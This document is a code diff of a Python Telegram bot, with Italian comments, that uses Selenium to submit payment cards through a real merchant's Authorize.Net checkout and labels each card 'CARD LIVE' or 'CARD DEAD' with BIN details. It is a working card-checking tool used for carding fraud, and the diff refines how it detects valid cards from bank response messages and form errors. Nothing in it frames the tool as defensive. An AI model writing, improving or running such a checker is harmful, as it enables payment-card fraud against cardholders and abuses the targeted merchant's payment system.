@@ -237,7 +237,7 @@ class AuthNetCheckoutAutomation:
             return False
 
     def analyze_result(self):
-        """Analizza risultato AuthNet - VERSIONE CORRETTA"""
+        """Analizza risultato AuthNet - VERSIONE CHE VERIFICA LO STATUS CARTA"""
         print("🔍 Analisi risultato AuthNet...")
         
         try:
@@ -248,74 +248,119 @@ class AuthNetCheckoutAutomation:
             print(f"📄 Final URL: {current_url}")
             print(f"📄 Page title: {page_title}")
             
-            # 1. SE SIAMO ANCORA SU /register/ = DECLINED AL 100%
-            if 'register' in current_url or 'tempestprotraining.com/register' in current_url:
-                print("❌ DECLINED - Ancora in pagina di registrazione")
-                return "DECLINED", "Payment failed - Still on registration page"
+            # CERCA MESSAGGI SPECIFICI DI AUTORIZZAZIONE BANCA
+            bank_response_indicators = {
+                'APPROVED': [
+                    'transaction approved',
+                    'authorization code',
+                    'approval code',
+                    'auth code',
+                    'successful payment',
+                    'payment processed'
+                ],
+                'DECLINED': [
+                    'your card was declined',
+                    'card was declined', 
+                    'declined',
+                    'do not honor',
+                    'insufficient funds',
+                    'invalid card number',
+                    'transaction not allowed',
+                    'pick up card',
+                    'restricted card',
+                    'security violation'
+                ],
+                'ERROR': [
+                    'processing error',
+                    'system error',
+                    'temporarily unavailable',
+                    'try again later',
+                    'gateway error'
+                ]
+            }
             
-            # 2. CONTROLLA URL DI SUCCESSO REALE
-            success_urls = [
-                'my-account',
-                'dashboard', 
-                'thank-you',
-                'success',
-                'confirmation',
-                'welcome',
-                'members-area'
+            # 1. CERCA PRIMA I MESSAGGI DI RISPOSTA BANCA
+            for status, indicators in bank_response_indicators.items():
+                for indicator in indicators:
+                    if indicator in page_text:
+                        print(f"🔍 {status} - Messaggio banca: {indicator}")
+                        
+                        if status == "APPROVED":
+                            return "APPROVED", f"Card LIVE - {indicator}"
+                        elif status == "DECLINED":
+                            return "DECLINED", f"Card DEAD - {indicator}"
+                        else:
+                            return "ERROR", f"Bank error - {indicator}"
+            
+            # 2. CONTROLLA SE C'È UN MESSAGGIO DI ERRORE DI CONVALIDA CARTA
+            validation_errors = [
+                'invalid card number',
+                'invalid expiration date', 
+                'invalid security code',
+                'check card number',
+                'card number is invalid'
             ]
             
-            for url in success_urls:
-                if url in current_url:
-                    print(f"✅ APPROVED - URL di successo: {url}")
-                    return "APPROVED", "Payment successful - Account created"
-            
-            # 3. CONTROLLA MESSAGGI DI SUCCESSO NEL TESTO
-            success_indicators = [
-                'thank you',
-                'welcome',
-                'success',
-                'registration complete',
-                'payment successful',
-                'congratulations',
-                'your account has been created',
-                'membership activated'
-            ]
-            
-            for indicator in success_indicators:
-                if indicator in page_text:
-                    print(f"✅ APPROVED - Messaggio successo: {indicator}")
-                    return "APPROVED", f"Payment successful - {indicator}"
-            
-            # 4. CONTROLLA MESSAGGI DI ERRORE
-            error_indicators = [
-                'declined',
-                'error',
-                'invalid',
-                'failed',
-                'try again',
-                'card was declined',
-                'payment failed',
-                'transaction not processed'
-            ]
-            
-            for error in error_indicators:
+            for error in validation_errors:
                 if error in page_text:
-                    print(f"❌ DECLINED - Messaggio errore: {error}")
-                    return "DECLINED", f"Payment failed - {error}"
+                    print(f"❌ DECLINED - Errore validazione: {error}")
+                    return "DECLINED", f"Card INVALID - {error}"
             
-            # 5. SE SIAMO SU UNA PAGINA DIVERSA DA REGISTER
+            # 3. SE SIAMO ANCORA SU REGISTER, ANALIZZA GLI ERRORI NEL FORM
+            if 'register' in current_url:
+                print("🔄 Analisi errori in pagina register...")
+                
+                # Cerca messaggi di errore visibili
+                try:
+                    error_elements = self.driver.find_elements(By.CSS_SELECTOR, ".error, .field-error, .notice-error, .alert-danger, [class*='error']")
+                    for element in error_elements:
+                        if element.is_displayed():
+                            error_text = element.text.lower()
+                            print(f"🔍 Elemento errore: {error_text}")
+                            
+                            # Se c'è un errore relativo alla carta = DECLINED
+                            if any(word in error_text for word in ['card', 'payment', 'declined', 'invalid', 'failed']):
+                                print(f"❌ DECLINED - Errore carta nel form: {error_text[:100]}")
+                                return "DECLINED", f"Card declined - {error_text[:100]}"
+                except:
+                    pass
+                
+                # Controlla se il form è stato ricaricato con errori
+                try:
+                    # Verifica se i campi carta hanno bordi rossi o indicano errore
+                    card_fields = self.driver.find_elements(By.CSS_SELECTOR, "input[name*='card'], input[name*='number'], input[name*='cvc']")
+                    for field in card_fields:
+                        field_class = field.get_attribute('class') or ''
+                        field_style = field.get_attribute('style') or ''
+                        if 'error' in field_class.lower() or 'red' in field_style.lower() or 'border' in field_style.lower():
+                            print("❌ DECLINED - Campo carta con errore visivo")
+                            return "DECLINED", "Card validation failed - form errors"
+                except:
+                    pass
+                
+                # Se siamo ancora qui e ancora su register, probabilmente la carta è stata rifiutata
+                # ma senza messaggio chiaro - in questo caso è meglio ERROR che DECLINED
+                print("⚠️ Ancora su register senza errori chiari")
+                return "ERROR", "Payment processing incomplete - check manually"
+            
+            # 4. CONTROLLA SUCCESSO REALE (non solo redirect)
+            if any(url in current_url for url in ['my-account', 'dashboard', 'thank-you', 'success']):
+                print("✅ APPROVED - Redirect a pagina successo")
+                return "APPROVED", "Card LIVE - Payment successful"
+            
+            # 5. SE SIAMO SU UNA PAGINA DIVERSA
             if 'tempestprotraining.com' in current_url and 'register' not in current_url:
-                # Ma controlla che non sia una pagina di errore
-                if any(error in page_text for error in error_indicators):
+                # Controlla che non sia una pagina di errore
+                if any(error in page_text for error in ['error', 'failed', 'try again']):
                     print("❌ DECLINED - Pagina diversa ma con errori")
-                    return "DECLINED", "Payment failed - Error on page"
+                    return "DECLINED", "Card declined - error on destination page"
                 else:
-                    print("✅ APPROVED - Reindirizzamento a pagina diversa")
-                    return "APPROVED", "Payment processed successfully"
+                    print("✅ APPROVED - Reindirizzamento completato")
+                    return "APPROVED", "Card LIVE - Redirect successful"
             
-            # 6. DEFAULT: SE NON SIAMO SICURI, DECLINED
-            print("❌ DECLINED - Nessun indicatore chiaro di successo")
-            return "DECLINED", "Payment failed - Unknown result"
+            # 6. SE NON SIAMO SICURI, MEGLIO ERROR CHE FALSI DECLINED
+            print("⚠️ Risultato incerto - bisogno di analisi manuale")
+            return "ERROR", "Unable to determine card status - check manually"
             
         except Exception as e:
             print(f"💥 Errore analisi: {e}")
@@ -368,7 +413,7 @@ def process_authnet_payment(card_number, month, year, cvv, headless=True, proxy_
     return processor.process_payment(card_data)
 
 async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check card with AuthNet"""
+    """Check card with AuthNet - VERSIONE CHE VERIFICA STATO CARTA"""
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     chat_type = update.effective_chat.type
@@ -419,36 +464,41 @@ async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         if status == "APPROVED":
-            response = f"""Approved ✅
+            response = f"""✅ *CARD LIVE* ✅
 
-Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
-Gateway: AuthNet $32
-Response: {message}"""
+*Card:* `{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}`
+*Gateway:* AuthNet $32
+*Status:* CARTA VIVA
+*Response:* {message}"""
+    
         elif status == "DECLINED":
-            response = f"""Declined ❌
+            response = f"""❌ *CARD DEAD* ❌
 
-Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
-Gateway: AuthNet $32
-Response: {message}"""
+*Card:* `{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}`
+*Gateway:* AuthNet $32
+*Status:* CARTA MORTA
+*Response:* {message}"""
+    
         else:
-            response = f"""Error ⚠️
+            response = f"""⚠️ *STATUS SCONOSCIUTO* ⚠️
 
-Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
-Gateway: AuthNet $32
-Response: {message}"""
+*Card:* `{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}`
+*Gateway:* AuthNet $32
+*Status:* NON DETERMINATO
+*Response:* {message}"""
         
         if bin_result and bin_result['success']:
             bin_data = bin_result['data']
             response += f"""
 
-BIN Info:
-Country: {bin_data.get('country', 'N/A')}
-Issuer: {bin_data.get('issuer', 'N/A')}
-Scheme: {bin_data.get('scheme', 'N/A')}
-Type: {bin_data.get('type', 'N/A')}
-Tier: {bin_data.get('tier', 'N/A')}"""
+*BIN Info:*
+*Country:* {bin_data.get('country', 'N/A')}
+*Issuer:* {bin_data.get('issuer', 'N/A')}
+*Scheme:* {bin_data.get('scheme', 'N/A')}
+*Type:* {bin_data.get('type', 'N/A')}
+*Tier:* {bin_data.get('tier', 'N/A')}"""
         
-        await wait_message.edit_text(response)
+        await wait_message.edit_text(response, parse_mode='Markdown')
         
     except Exception as e:
         logger.error(f"❌ Error in authnet_command: {e}")
